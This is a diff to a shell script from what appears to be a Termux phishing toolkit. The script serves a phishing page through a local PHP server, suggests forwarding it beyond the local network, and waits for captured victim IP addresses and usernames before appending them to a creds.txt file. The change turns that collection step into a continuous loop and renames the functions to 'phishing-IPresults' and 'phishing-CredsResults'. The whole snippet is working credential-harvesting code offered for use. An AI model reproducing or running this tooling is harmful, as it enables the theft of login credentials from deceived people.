@@ -181,19 +181,23 @@ if [ ! -e $TMP_PATH/creds.txt ]; then
 fi
 
 printf "$G\n[+]->$W Credentials will be save in \$PREFIX/var/service/php/$SITE/creds.txt$Y\n[!]->$W Server php running on http://127.0.0.1:4546$Y\n[!]->$W To lunch it out of lan run :$G i-Haklab forwarding$B\n[-]->$W Waiting for information . . .\n"
-#while [ true ]; do
+while [ true ]; do
+
 
 until [ -e $TMP_PATH/ip.txt ]; do
 	sleep 10
 done
 exec date >> $TMP_PATH/creds.txt
-cat $TMP_PATH/ip.txt >> $TMP_PATH/creds.txt
-IPs
+exec cat $TMP_PATH/ip.txt >> $TMP_PATH/creds.txt
+phishing-IPresults
 
 until [ -e $TMP_PATH/usernames.txt ]; do
 	sleep 10
 done
 exec date >> $TMP_PATH/creds.txt
-cat $TMP_PATH/usernames.txt >> $TMP_PATH/creds.txt
-Creds
-#            @Ivam3
+exec cat $TMP_PATH/usernames.txt >> $TMP_PATH/creds.txt
+phishing-CredsResults
+
+
+done
+#		@IVAM3
